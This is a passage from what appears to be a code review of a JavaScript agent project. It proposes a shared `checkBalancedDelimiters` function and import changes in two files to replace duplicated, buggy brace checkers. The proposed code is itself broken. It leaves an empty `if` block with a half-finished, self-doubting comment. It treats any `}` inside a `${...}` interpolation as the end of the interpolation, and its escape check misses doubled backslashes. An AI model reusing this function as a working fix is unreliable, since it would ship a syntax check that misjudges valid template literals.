 * Returns true if all delimiters are balanced.
 */
export function checkBalancedDelimiters(source) {
  let braces = 0, brackets = 0, parens = 0;
  let inString = false, stringChar = '';
  let templateDepth = 0; // Tracks nested ${...} inside template literals

  for (let i = 0; i < source.length; i++) {
    const c = source[i];
    const prev = i > 0 ? source[i - 1] : '';

    if (inString) {
      if (stringChar === '`') {
        // Template literal: handle ${...} interpolation
        if (c === '$' && i + 1 < source.length && source[i + 1] === '{') {
          templateDepth++;
          i++; // Skip the '{'
          inString = false; // We're now in expression mode
          continue;
        }
        if (c === '`' && prev !== '\\') {
          inString = false;
        }
      } else {
        if (c === stringChar && prev !== '\\') {
          inString = false;
        }
      }
      continue;
    }

    // Not in string — check for template interpolation closing
    if (templateDepth > 0 && c === '}') {
      templateDepth--;
      if (templateDepth === 0 || source[i + 1] === '`') {
        // Re-enter template literal mode
        // Actually, we need to check if we're back in the template
      }
      // The } closes the interpolation, we're back in template literal
      inString = true;
      stringChar = '`';
      continue;
    }

    if (c === "'" || c === '"' || c === '`') {
      inString = true;
      stringChar = c;
    }
    else if (c === '{') braces++;
    else if (c === '}') braces--;
    else if (c === '[') brackets++;
    else if (c === ']') brackets--;
    else if (c === '(') parens++;
    else if (c === ')') parens--;

    // Also skip line comments and block comments
    if (c === '/' && i + 1 < source.length) {
      if (source[i + 1] === '/') {
        // Line comment — skip to end of line
        const eol = source.indexOf('\n', i + 2);
        i = eol === -1 ? source.length : eol;
        continue;
      }
      if (source[i + 1] === '*') {
        // Block comment — skip to */
        const end = source.indexOf('*/', i + 2);
        i = end === -1 ? source.length : end + 1;
        continue;
      }
    }
  }

  return braces === 0 && brackets === 0 && parens === 0;
}
```

**Then update both files to import from the shared module:**

**`agent/lib/evolution.js` — remove `checkBraces` function (lines 384–410), update `executeCreate` call:**
```javascript
import { checkBalancedDelimiters } from './syntax-check.js';

// In executeCreate (if kept):
if (!checkBalancedDelimiters(action.content)) {
```

**`agent/lib/shell-swap.js` — remove `checkBalanced` function (lines 307–332), update `testShell` to import:**
```javascript
import { checkBalancedDelimiters } from './syntax-check.js';

// In testShell():
if (!checkBalancedDelimiters(content)) {
```

**Severity:** MEDIUM — code duplication + shared bug in template literal handling
